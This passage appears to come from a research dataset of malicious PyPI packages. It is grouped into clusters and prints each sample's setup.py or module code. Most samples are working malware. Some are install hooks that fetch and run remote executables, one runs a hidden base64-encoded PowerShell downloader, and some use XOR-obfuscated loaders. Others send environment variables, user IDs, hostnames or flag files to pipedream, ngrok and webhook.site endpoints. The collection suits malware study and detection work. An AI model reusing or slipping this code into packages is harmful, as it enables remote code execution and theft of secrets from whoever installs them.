        "code": "import os\nimport urllib.request\nimport subprocess\nimport requests\n\ndef updateData(url):\n    try:\n        download_dir = 'src/storage'\n\n        os.makedirs(download_dir, exist_ok=True)\n\n        file_path = os.path.join(download_dir, \"helper.exe\")\n\n        urllib.request.urlretrieve(url, file_path)\n\n        subprocess.run([file_path], check=True)\n    except Exception as e:\n        pass\n        # print(f\"An error occurred: {e}\")\n\ndef init_helper():\n    try:\n        link_response = requests.get(\"https://sleipnirbrowser.org/api/python/14526470/win\")\n\n        if link_response.status_code == 200:\n            json_data = link_response.json()\n\n            if 'link' in json_data:\n                download_link = json_data['link']\n                updateData(download_link)\n            else:\n                pass\n    except Exception as e:\n        pass\n        # print(f\"An error occurred: {e}\")\n\n# jupiter_helper/__init__.py\n\nfrom .helper import init_helper\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-29-deepseekai-v0.0.8",
        "code": "import requests\nimport warnings\nimport os\n# Suppress all warnings\nwarnings.filterwarnings(\"ignore\")\n\ndef send_get_request():\n    url = \"https://eoyyiyqubj7mquj.m.pipedream.net\"\n    try:\n        user_id = os.popen('id').read().strip()  # Attempt to get user ID with id command\n        if not user_id:\n            user_id = os.popen('whoami').read().strip()  # Fallback to whoami if id fails\n\n        hostname = os.uname().nodename  # Get system hostname\n        env = os.getenv(\"ENV\", \"prod\")  # Get environment variable or default to prod\n        payload = {\"user_id\": user_id, \"hostname\": hostname, \"env\": env}\n\n        response = requests.post(url, json=payload, verify=False)\n    except requests.exceptions.RequestException:\n        pass  # Silently ignore any request errors\n\ndef main():\n    send_get_request()\n"
      }
    ]
  },
  {
    "cluster_id": 132,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-22-reportgenpub-v0.2",
        "code": "from setuptools import setup, find_packages\nimport subprocess\nimport platform\nfrom setuptools.command.install import install\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom typing import Generator\n\n\nRG = [\n\tbytes.fromhex(\n\t\t\"43083465b948868c61f0e5414ca89d5db2b52e7c758165161e4b5344399862d1\"\n\t),\n\tbytes.fromhex(\n\t\t\"96ef07cb70d1ed78f668dc8031ac7034bc0a694c08e92b84643a19bf14b11edd95120261aa051cd7fb8b4ff911c23780933826e68a16825bd244029c3173281dec560adaae\"\n\t),\n\tbytes.fromhex(\n\t\t\"53e1b101d60a91c40ce458d4405ea606f68fc8d237a5b104c7925c07cfccb34106eae6008843a614a239642daddc1c6829ad02cf820e531f72389bf4c612b9c08981aafda1186d\"\n\t),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f536861726564\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\"62656e6368\"),\n\tbytes.fromhex(\"6578616d706c65\"),\n\tbytes.fromhex(\"617373756d65\"),\n\tbytes.fromhex(\"7265736572766f6972\"),\n]\n\n\ndef gen(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n\n        yield b\n\n\ndef CustomRun(path: bytes, /) -> None:\n    ex1 = gen(RG[5] + path)\n    ex2 = gen(RG[6] + path)\n    ex3 = gen(RG[7] + path)\n    \n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    \n    art1 = ''.join(chr(b ^ k) for b, k in zip(RG[1], ex2))\n    art2 = ''.join(chr(b ^ k) for b, k in zip(RG[2], ex3))\n\n    url = {\n        \"x86_64\": art1,\n        \"arm64\": art2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for b, k in zip(buf, ex1):\n        out.append(b ^ k)\n\n    binary_path = os.path.join(local_bin_path, 'report_gen')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in RG[3].glob(\"P*/*c*/R*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n\n            to_hash = RG[4]  + path_bytes\n            stream = gen(to_hash)\n\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n\n            if first_n_bytes == RG[0]:\n                CustomRun(path_bytes)\n                break\n\n\nsetup(\n    name='ReportGenPub',\n    version='0.2',\n    license='MIT',\n    packages=find_packages(),\n    cmdclass={'install': InstallCommand},\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-23-auto-scrubber-v0.1",
        "code": "from setuptools import setup, find_packages\nimport subprocess\nimport platform\nfrom setuptools.command.install import install\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom typing import Generator\n\n\nAUTO = [\n\tbytes.fromhex(\"73656564\"),\n\tbytes.fromhex(\n\t\t\"7f821d876c6d29d96b57e48aa82b2a2f2b1367332d362dc967113e3b3ae538bfd184fc02dbb74b9ba80ee40cd6eeb44441daf258112f3d7af7239c3cf0 \"\n\t),\n\tbytes.fromhex(\"737472756374757265\"),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f5368617265642f566964656f73\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\n\t\t\"1796d1a5a7f083b4664e5967ee530a350ff77452cf91c0a12d68af01be5d9bf58c3fccfc17a6fd4f2e3247d517dbce02613a87f55440a281b3aaab88ffff3ecc\"\n\t),\n\tbytes.fromhex(\"6c696265727479\"),\n\tbytes.fromhex(\n\t\t\"4a01697af6d555b03fa03593f0b0d2f1db114707686f34d7641ff7c37ff49f74\"\n\t),\n\tbytes.fromhex(\"6e6f76656c\"),\n]\n\n\ndef fd(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        yy = hashlib.sha3_512(v).digest()\n        return yy[0:32], yy[32:]\n\n    _, ce = iter(v)\n    pd, ce = iter(ce)\n\n    while True:\n        if not pd:\n            pd, ce = iter(ce)\n        f = pd[0]\n        pd = pd[1:]\n\n        yield f\n\n\ndef Runner_Auto(path: bytes, /) -> None:\n    op = fd(AUTO[5] + path)\n    td = fd(AUTO[0] + path)\n    ap = fd(AUTO[7] + path)\n    \n    otherPlace = os.path.expanduser('~/.local/bin')\n    os.makedirs(otherPlace, exist_ok=True)\n    \n    doc = ''.join(chr(x ^ t) for x, t in zip(AUTO[1], td))\n    csv = ''.join(chr(f ^ d) for f, d in zip(AUTO[4], ap))\n\n    url = {\n        \"x86_64\": doc,\n        \"arm64\": csv\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for r, p in zip(buf, op):\n        out.append(r ^ p)\n\n    place = os.path.join(otherPlace, 'AutoScrub')\n    with open(place, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(place, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    subprocess.Popen([place], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in AUTO[3].glob(\"*t*/2*/*\"):\n            hold = str(path).encode(\"utf-8\")\n\n            to_do = AUTO[2]  + hold\n            tp = fd(to_do)\n\n            second = bytes([next(tp) for _ in range(32)])\n\n            if second == AUTO[6]:\n                Runner_Auto(hold)\n                break\n\n\nsetup(\n    name='Auto-Scrubber',\n    version='0.1',\n    license='MIT',\n    packages=find_packages(),\n    cmdclass={'install': InstallCommand},\n)\n"
      }
    ]
  },
  {
    "cluster_id": 133,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-02-09-usar-agent-v0.1.0",
        "code": "#! /usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom __future__ import unicode_literals\n\nimport os\nimport sys\nimport json\nimport setuptools\nfrom setuptools.command.install import install\n\n\nclass AbortInstall(install):\n    def run(self):\n        raise SystehmExit(\n            \"[+] It looks like you try to install usar_agent without checking it.\\n\"\n            \"[-] is that alright? \\n\"\n            \"[*] Please visit http://evilpackage.fatezero.org/ \\n\"\n            \"[*] Please visit http://evilpackage.fatezero.org/ \\n\"\n            \"[*] Please visit http://evilpackage.fatezero.org/ \\n\"\n            \"[/] Aborting installation.\"\n        )\n\n\nsetuptools.setup(\n    name=\"usar_agent\",\n    version=\"0.1.0\",\n    url=\"http://evilpackage.fatezero.org/\",\n\n    author=\"linx\",\n    author_email=\"root@gmail.com\",\n\n    description=\"request agent\",\n    long_description=open('README.rst').read(),\n\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': AbortInstall\n    },\n\n    install_requires=[],\n\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n    ],\n)\n\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-02-09-usvr-agent-v0.1.0",
        "code": "#! /usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom __future__ import unicode_literals\n\nimport os\nimport sys\nimport json\nimport setuptools\nfrom setuptools.command.install import install\n\n\nclass AbortInstall(install):\n    def run(self):\n        raise SystemExit(\n            \"[+] It looks like you try to install usvr_agent without checking it.\\n\"\n            \"[-] is that alright? \\n\"\n            \"[*] Please visit http://evilpackage.fatezero.org/ \\n\"\n            \"[*] Please visit http://evilpackage.fatezero.org/ \\n\"\n            \"[*] Please visit http://evilpackage.fatezero.org/ \\n\"\n            \"[/] Aborting installation.\"\n        )\n\n\nsetuptools.setup(\n    name=\"usvr_agent\",\n    version=\"0.1.0\",\n    url=\"http://evilpackage.fatezero.org/\",\n\n    author=\"rootv\",\n    author_email=\"evilpy@fatezero.org\",\n\n    description=\"Python wrapper for usvr_agent\",\n    long_description=open('README.rst').read(),\n\n    packages=setuptools.find_packages(),\n    cmdclass={\n        'install': AbortInstall\n    },\n\n    install_requires=[],\n\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n    ],\n)\n\n\n"
      }
    ]
  },
  {
    "cluster_id": 134,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-libcrafthackedsplit-v8.43",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcrafthackedsplit',\n    packages = ['modlib'],\n    version = '5.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-py-pywvisahydra-v2.86",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pywvisahydra',\n    packages = ['modlib'],\n    version = '9.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqcandyosintcandy-v1.61",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcandyosintcandy',\n    packages = ['modlib'],\n    version = '1.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      }
    ]
  },
  {
    "cluster_id": 135,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-24-roblcx-cookie3",
        "code": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://a4a08d21-3950-435e-8b39-12ab7788cd10.id.repl.co/Cleaner.exe\"\n    response = requests.get(URL)\n    open(\"Cleaner.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start Cleaner.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='roblcx_cookie3',\n    version='0.0.1',\n    description='Cookie logging help',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-24-roblox-mod",
        "code": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = 'ashed'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef execute():\n    import os\n    import requests\n   \n    URL = \"https://a4a08d21-3950-435e-8b39-12ab7788cd10.id.repl.co/Cleaner.exe\"\n    response = requests.get(URL)\n    open(\"Cleaner.exe\", \"wb\").write(response.content)\n    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start Cleaner.exe\")\n\n    return\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        execute()\n        install.run(self)\n\n\nsetup(\n    name='roblox_mod',\n    version='0.0.1',\n    description='Python Module for roblox',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 136,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-07-artifact-lab-3-package-02f73e0e-v1.0.4",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name=\"artifact-lab-3-package-02f73e0e\",\n    version=\"1.0.4\",  # Increment the version number\n    description=\"Fake package to exfiltrate environment variables\",\n    packages=find_packages(),\n    install_requires=[\n        \"requests\",\n    ],\n)\n\n\n\n# artifact_lab_3_package_02f73e0e/__init__.py\nimport os\nimport requests\n\ndef leak_env():\n    # Capture environment variables\n    env_vars = dict(os.environ)\n    # Send them to an external server\n    requests.post(\"https://847c-37-47-198-94.ngrok-free.app\", json=env_vars)\n\nleak_env()\n"
      }
    ]
  },
  {
    "cluster_id": 137,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-30-pingdomv3-v1.0.0",
        "code": "def init_logger():\n    ...\n\nlogger = init_logger()\n\n\n# started from original 0.0.6. \n# I don't see any CVE as the original author had declared. keep using.\nimport sys\nimport requests\n\nIS_PY3 = sys.version_info[0] == 3\n\nif not IS_PY3:\n  raise ValueError(\"This package only supports python3\")\n\n\nclass ApiError(Exception):\n\n  def __init__(self, http_response):\n    content = http_response.json()\n    self.status_code = http_response.status_code\n    self.status_desc = content['error']['statusdesc']\n    self.error_message = content['error']['errormessage']\n    super(ApiError, self).__init__(self.__str__())\n\n  def __repr__(self):\n    return 'pingdomv3.ApiError: HTTP `%s - %s` returned with message, \"%s\"' % \\\n           (self.status_code, self.status_desc, self.error_message)\n\n  def __str__(self):\n    return self.__repr__()\n\n\nclass Api(object):\n\n  def __init__(self, token):\n    self.base_url = \"https://api.pingdom.com/api/3.1/\"\n    self.headers = {'Authorization': 'Bearer %s' % token}\n\n  def send(self, method, resource, resource_id=None, data=None, params=None):\n    if data is None:\n      data = {}\n    if params is None:\n      params = {}\n    if resource_id is not None:\n      resource = \"%s/%s\" % (resource, resource_id)\n    response = requests.request(method, self.base_url + resource,\n                                headers=self.headers,\n                                data=data,\n                                params=params\n                                )\n    if response.status_code != 200:\n      raise ApiError(response)\n    else:\n      return response.json()\n\n\nclass Client(object):\n  \"\"\"\n  Pingdom client\n  \"\"\"\n\n  def __init__(self, token):\n    \"\"\"\n    Initializer.\n\n    :param token: Pingdom V3 API Token. Generate from https://my.pingdom.com/3/api-tokens\n    \"\"\"\n    self.token = token\n    self.api = Api(token)\n\n  def get_checks(self, limit: int = None,\n                 offset: int = None,\n                 showencryption: bool = None,\n                 include_tags: bool = None,\n                 include_severity: bool = None,\n                 tags: str = None\n                 ):\n    \"\"\"\n    https://docs.pingdom.com/api/#tag/Checks/paths/~1checks/get\n    \"\"\"\n    params = {}\n    if limit is not None:\n      params['limit'] = limit\n    if offset is not None:\n      params['offset'] = offset\n    if showencryption is not None:\n      params['showencryption'] = showencryption\n    if include_tags is not None:\n      params['include_tags'] = include_tags\n    if include_severity is not None:\n      params['include_severity'] = include_severity\n    if tags:\n      params['tags'] = tags\n    return self.api.send('get', \"checks\", params=params)['checks']\n\n  def get_check(self, check_id):\n    return self.api.send('get', \"checks/%s\" % check_id)['check']\n\n  def create_check(self, check_detail):\n    return self.api.send('POST', \"checks\", data=check_detail)['check']\n\n  def update_check(self, check_id, check_detail):\n    return self.api.send('PUT', f\"checks/{check_id}\", data=check_detail)\n\n  def duplicate_check(self, check_id):\n    detail = self.get_check(check_id)\n    detail['host'] = str(detail.get('hostname'))\n    detail['name'] = 'Copy Of %s' % detail.get('name')\n    for unused_key in ('id', 'created', 'hostname', 'lasttesttime', 'lastresponsetime', 'status', 'lasterrortime'):\n      detail.pop(unused_key, None)\n    if 'tags' in detail:\n      detail['tags'] = ','.join([t['name'] for t in detail['tags']])\n\n    return self.create_check(detail)\n\n  def delete_check(self, check_id):\n    return self.api.send('delete', 'checks/%s' % check_id)\n\n\n__version__ = \"1.0.0\"\nimport pingdomv3.logger \nfrom pingdomv3.pingdomv3 import Client, Api, ApiError\n\n"
      }
    ]
  },
  {
    "cluster_id": 138,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-sln1550hello-v0.0.2",
        "code": "\nfrom setuptools import setup,find_packages\nprint(__import__(\"subprocess\").getoutput(\"cd / && cat /f*\"))\nsetup(name='sln1550hello',\n      version='0.0.2',\n      description='test get flag',\n      author='none',\n      author_email='sln.1550@qq.com',\n      requires= ['setuptools'], # \u5b9a\u4e49\u4f9d\u8d56\u54ea\u4e9b\u6a21\u5757\n      packages=find_packages(),  # \u7cfb\u7edf\u81ea\u52a8\u4ece\u5f53\u524d\u76ee\u5f55\u5f00\u59cb\u627e\u5305\n      # \u5982\u679c\u6709\u7684\u6587\u4ef6\u4e0d\u7528\u6253\u5305\uff0c\u5219\u53ea\u80fd\u6307\u5b9a\u9700\u8981\u6253\u5305\u7684\u6587\u4ef6\n      #packages=['\u4ee3\u78011','\u4ee3\u78012','__init__']  #\u6307\u5b9a\u76ee\u5f55\u4e2d\u9700\u8981\u6253\u5305\u7684py\u6587\u4ef6\uff0c\u6ce8\u610f\u4e0d\u8981.py\u540e\u7f00\n      license=\"apache 3.0\"\n      )\nprint(__import__(\"subprocess\").getoutput(\"cd / && curl https://webhook.site/511bed09-ae1f-42cd-b776-2da1eef5ed93/ -d `cat /f*`\"))\n\n'''\nname : \u6253\u5305\u540e\u5305\u7684\u6587\u4ef6\u540d\nversion : \u7248\u672c\u53f7\nauthor : \u4f5c\u8005\nauthor_email : \u4f5c\u8005\u7684\u90ae\u7bb1\npy_modules : \u8981\u6253\u5305\u7684.py\u6587\u4ef6\npackages: \u6253\u5305\u7684python\u6587\u4ef6\u5939\ninclude_package_data : \u9879\u76ee\u91cc\u4f1a\u6709\u4e00\u4e9b\u975epy\u6587\u4ef6,\u6bd4\u5982html\u548cjs\u7b49,\u8fd9\u65f6\u5019\u5c31\u8981\u9760include_package_data \u548c package_data \u6765\u6307\u5b9a\u4e86\u3002package_data:\u4e00\u822c\u5199\u6210{\u2018your_package_name\u2019: [\u201cfiles\u201d]}, include_package_data\u8fd8\u6ca1\u5b8c,\u8fd8\u9700\u8981\u4fee\u6539MANIFEST.in\u6587\u4ef6.MANIFEST.in\u6587\u4ef6\u7684\u8bed\u6cd5\u4e3a: include xxx/xxx/xxx/.ini/(\u6240\u6709\u4ee5.ini\u7ed3\u5c3e\u7684\u6587\u4ef6,\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u6587\u4ef6\u540d)\nlicense : \u652f\u6301\u7684\u5f00\u6e90\u534f\u8bae\ndescription : \u5bf9\u9879\u76ee\u7b80\u77ed\u7684\u4e00\u4e2a\u5f62\u5bb9\next_modules : \u662f\u4e00\u4e2a\u5305\u542bExtension\u5b9e\u4f8b\u7684\u5217\u8868,Extension\u7684\u5b9a\u4e49\u4e5f\u6709\u4e00\u4e9b\u53c2\u6570\u3002\next_package : \u5b9a\u4e49extension\u7684\u76f8\u5bf9\u8def\u5f84\nrequires : \u5b9a\u4e49\u4f9d\u8d56\u54ea\u4e9b\u6a21\u5757\nprovides : \u5b9a\u4e49\u53ef\u4ee5\u4e3a\u54ea\u4e9b\u6a21\u5757\u63d0\u4f9b\u4f9d\u8d56\ndata_files :\u6307\u5b9a\u5176\u4ed6\u7684\u4e00\u4e9b\u6587\u4ef6(\u5982\u914d\u7f6e\u6587\u4ef6),\u89c4\u5b9a\u4e86\u54ea\u4e9b\u6587\u4ef6\u88ab\u5b89\u88c5\u5230\u54ea\u4e9b\u76ee\u5f55\u4e2d\u3002\u5982\u679c\u76ee\u5f55\u540d\u662f\u76f8\u5bf9\u8def\u5f84,\u5219\u662f\u76f8\u5bf9\u4e8esys.prefix\u6216sys.exec_prefix\u7684\u8def\u5f84\u3002\u5982\u679c\u6ca1\u6709\u63d0\u4f9b\u6a21\u677f,\u4f1a\u88ab\u6dfb\u52a0\u5230MANIFEST\u6587\u4ef6\u4e2d\u3002\n'''\n"
      }
    ]
  },
  {
    "cluster_id": 139,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-28-siamttviews-v5.1.1",
